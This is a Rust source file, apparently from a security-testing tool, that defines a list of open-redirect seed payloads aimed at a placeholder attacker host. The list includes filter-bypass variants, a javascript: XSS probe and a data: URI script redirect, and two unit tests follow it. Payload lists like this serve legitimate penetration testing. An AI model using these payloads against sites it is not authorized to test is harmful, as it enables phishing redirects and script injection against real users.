//! Open-redirect seed payloads. `EVIL.SITE` is a placeholder the
//! primitive crate replaces with the engagement's controlled host.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::OpenRedirect;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "https://EVIL.SITE/",
        notes: "absolute external URL — direct probe",
        tags: &["absolute"],
    },
    Payload {
        category: C,
        value: "//EVIL.SITE/",
        notes: "protocol-relative — browser honors current scheme",
        tags: &["protocol-relative"],
    },
    Payload {
        category: C,
        value: "/\\EVIL.SITE/",
        notes: "slash-backslash confusion — some parsers treat `/\\` as protocol-relative",
        tags: &["filter-bypass"],
    },
    Payload {
        category: C,
        value: "https:EVIL.SITE",
        notes: "scheme-without-slashes — some validators require `//`",
        tags: &["filter-bypass"],
    },
    Payload {
        category: C,
        value: "https://victim.example.com.EVIL.SITE/",
        notes: "subdomain confusion — host suffix matches victim domain",
        tags: &["confusion"],
    },
    Payload {
        category: C,
        value: "https://EVIL.SITE/victim.example.com",
        notes: "path-based confusion — victim domain in path, not host",
        tags: &["confusion"],
    },
    Payload {
        category: C,
        value: "https://victim.example.com@EVIL.SITE/",
        notes: "userinfo bypass — browser uses host after `@`",
        tags: &["userinfo", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "https://victim.example.com%2eEVIL.SITE/",
        notes: "URL-encoded dot — sometimes survives normalization filters",
        tags: &["encoding", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "javascript:alert(1)",
        notes: "javascript: scheme — XSS via open-redirect sink",
        tags: &["xss-overlap", "scheme-confusion"],
    },
    Payload {
        category: C,
        value: "data:text/html,<script>document.location='https://EVIL.SITE'</script>",
        notes: "data: URI redirect — works on browsers that follow data: from redirects",
        tags: &["data-uri", "scheme-confusion"],
    },
    Payload {
        category: C,
        value: "////EVIL.SITE/",
        notes: "quadruple-slash — some parsers collapse to `//EVIL.SITE`",
        tags: &["filter-bypass"],
    },
    Payload {
        category: C,
        value: "https://EVIL.SITE%23victim.example.com/",
        notes: "fragment-encoded — `%23` is `#`; tricks naive prefix filters",
        tags: &["encoding", "filter-bypass"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_open_redirect_class() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::OpenRedirect);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_filter_bypass_variants() {
        let bypasses = PAYLOADS
            .iter()
            .filter(|p| p.tags.contains(&"filter-bypass"))
            .count();
        assert!(bypasses >= 3);
    }
}
